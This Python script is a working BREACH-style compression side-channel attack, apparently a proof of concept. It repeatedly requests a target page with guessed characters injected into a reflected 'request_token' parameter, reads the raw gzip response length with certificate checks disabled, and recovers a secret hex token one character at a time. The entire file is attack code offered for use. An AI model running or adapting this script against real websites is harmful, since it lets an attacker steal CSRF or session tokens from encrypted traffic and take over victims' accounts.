import requests
import time
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target
url = 'https://malbot.net/poc/'
param_name = 'request_token'
possible_chars = '0123456789abcdef'

padding = '{}'
# Initial guess
guessed_token = ''

def get_response_length(url, param_name, guess):
    # Construct full url
    full_url = f"{url}?{param_name}=%27{guess}"
    # print(f"Fetching URL: {full_url}")

    headers = {
        'Accept-Encoding': 'gzip, deflate'  # Compress response
    }
    try:
        # Get page
        response = requests.get(full_url, headers=headers, verify=False, stream=True)
        response.raise_for_status()

        # Disable automatic decompression
        response.raw.decode_content = False

        # Read the raw compressed response
        compressed_content = response.raw.read()
        compressed_length = len(compressed_content)
        return compressed_length
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None


def guess_token(url, param_name, possible_chars, padding, padding_amount=1):
    guessed_token = ''
    while True:
        found_char = False

        for c in possible_chars:
            # Get the response length for the current guess
            response_lengths = [
                get_response_length(url, param_name, guessed_token + c + padding*padding_amount + '@'),  # test Hoffman and LZ77
                get_response_length(url, param_name, guessed_token + padding*padding_amount + c + '@')   # test only Hoffman
            ]
            if None in response_lengths:
                continue  # Skip to the next character if the request failed
            print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")

            # If LZ77 compressed, the character is correct
            if response_lengths[1] > response_lengths[0]:
                print(f"Found character: '{c}'")
                guessed_token += c
                found_char = True
                break
            # time.sleep(0.01)  # Delay to avoid overwhelming the server

        if not found_char:
            print("Could not find the next character. Exiting.")
            break

    print(f"Guessed token: '{guessed_token}'")
    return guessed_token


def main():
    # Test different padding lengths
    guessed_tokens = {}
    for padding_amount in range(1,21):
        guessed_tokens[padding_amount] = guess_token(url, param_name, possible_chars, padding, padding_amount)
    # Sort by number of guessed characters
    for padding_amount, token in sorted(guessed_tokens.items(), key=lambda x: len(x[1]), reverse=True):
        print(f"Padding Amount: {padding_amount}, Token Length: {len(token)}, Token: '{token}'")


if __name__ == '__main__':
    main()


# TODO 
# - increase padding amount only when no character is found
# - try multiple characters at once